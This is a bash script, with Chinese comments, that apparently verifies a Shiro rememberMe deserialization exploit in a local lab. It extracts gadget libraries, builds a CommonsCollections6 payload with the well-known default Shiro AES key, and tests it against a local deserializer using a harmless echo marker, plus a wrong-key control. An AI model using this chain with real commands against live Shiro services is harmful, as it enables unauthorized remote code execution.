#!/bin/bash
# 决定性验证（修正版）：用真实 Java 反序列化 payload，验证公私钥/模板/链是否成立
set -e
W=/tmp/t7-deser
rm -rf $W && mkdir -p $W/jars $W/lib
# 从 shiro fat jar 里直接抽取 gadget 依赖
cd $W/lib
unzip -o -q /shirodemo-1.0-SNAPSHOT.jar 'BOOT-INF/lib/*' >/dev/null 2>&1 || true
for j in commons-collections-3.2.1.jar commons-logging-1.1.1.jar commons-beanutils-1.9.2.jar shiro-core-1.2.4.jar commons-codec-1.11.jar; do
  cp BOOT-INF/lib/$j $W/jars/ 2>/dev/null && echo "copied $j" || echo "miss $j"
done
ls $W/jars/
CP=$(ls $W/jars/*.jar | tr '\n' ':')
echo "CP=$CP"
echo "=== generate CC6 payload with harmless marker command (NEVER runs real cmd) ==="
ruby /tmp/t7-c1-shiro-gen.rb CommonsCollections6 'echo LOOP3T7DESERMARKER' $W/cc6.txt 'kPH+bIxk5D2deZiIxcaaaA==' 2>&1 | grep -E 'SER_LEN|COOKIE_LEN|PLAIN'
cp /tmp/t7-c1-matrix/P1_valid_serialized_string.txt $W/p1.txt
echo "=== [TEST A] P1: valid serialized String, correct key ==="
timeout 90 java -cp "$CP" $W/T7LocalDeser.java $W/p1.txt 'kPH+bIxk5D2deZiIxcaaaA==' 'OK' 2>&1 | head -12
echo "=== [TEST B] CC6 gadget, correct key, harmless marker ==="
timeout 90 java -cp "$CP" $W/T7LocalDeser.java $W/cc6.txt 'kPH+bIxk5D2deZiIxcaaaA==' 'LOOP3T7DESERMARKER' 2>&1 | head -12
echo "=== [TEST C] P1 with WRONG key (control) ==="
timeout 90 java -cp "$CP" $W/T7LocalDeser.java $W/p1.txt 'MTIzNDU2Nzg5MGFiY2RlZg==' 'OK' 2>&1 | head -8
echo "=== DONE ==="
